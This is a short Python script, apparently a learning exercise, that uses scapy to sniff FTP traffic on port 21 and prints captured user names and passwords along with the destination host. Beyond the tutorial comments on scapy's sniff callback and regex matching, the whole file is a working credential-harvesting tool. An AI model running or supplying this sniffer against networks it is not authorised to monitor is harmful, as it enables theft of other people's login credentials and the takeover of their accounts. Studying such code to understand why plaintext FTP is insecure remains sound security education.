'''
Created on 23 Jul 2021

@author: adam
'''
#!/usr/bin/python3

from scapy.all import *
import argparse

# Note this will only work on Linux system not windows !!!

#===============================================================================
# Understanding the prn in sniff:
# Scapy has a sniff function that is great for getting packets off the wire,
# but there's much more to show off how great this function really is! sniff 
# has an argument prn that allows you to pass a function that executes with each packet sniffe>
# The intended purpose of this function is to control how the packet prints out
# in the console allowing you to replace the default packet printing display with
# a format of your choice.
# 
# The prn argument is defined as:
#     prn: function to apply to each packet. 
#     If something is returned, it is displayed.
#     For instance you can use prn = lambda x: x.summary()
#
# pkt in our ftpSniff are the packets being 
# passed in when we use prn= in sniff on line 68
#===============================================================================



#===============================================================================
# re.findall is a class within the re module which is used to find patterns
# It is used here to find patterns within a string or other data sets
# More accurately here we are searching for the string that is input 
# by the user after the word USER or PASS is displayed in the console 
#===============================================================================


def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)',raw)
    pswd = re.findall('(?i)PASS (.*)',raw)
    
    if user:
        print(f'[*] Detected FTP Login to: {str(dest)}')
        print(f'[+] User Account: {str(user[0])}')
    elif pswd:
        print(f'[+] Password: {str(pswd[0])}')
    
        
def main():
    #Instantiate argparse variable
    parser = argparse.ArgumentParser(description='Usage of program: -i <interface>')
    
    #add argument to parser obj. parameters: name, help description, variable type
    parser.add_argument('-i', help='Interface', type=str)
    
    #arg variable of parse_args(). 
    #(args is used to set our own veriables to)
    args = parser.parse_args()
    
    #Variable interface set equal to -i within the parser
    interface = args.i
    
    #set interface equal to user iuput
    if interface == None:
        print(parser.description)
        exit(0)
    else:
        conf.iface = interface
    #Start sniff, fillter to sniff only tcp port. 
    #prn is set to run my ftpSniff function 
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)
        
main()
    
